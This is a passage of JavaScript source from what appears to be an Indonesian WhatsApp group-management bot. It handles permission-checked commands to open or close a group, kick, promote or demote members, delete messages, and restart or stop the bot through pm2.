reply(sewa)
break








case 'grup':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return reply("silahkan pilih grup open/close")
if (args[0] === 'open'){ await adon.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'close'){ await adon.groupSettingUpdate(from, 'announcement')} else { reply('yang bener lah pantek')}
break

case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await adon.groupParticipantsUpdate(from, [remove], "remove")
break

case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await adon.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await adon.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

case 'leave':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await adon.groupLeave(from)
break

case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
adon.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart index`, (error, stdout, stderr) => {
    reply("BERHASIL RESTART ULANG")
    reply(stdout)
})
break

case 'shutdown':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
}
}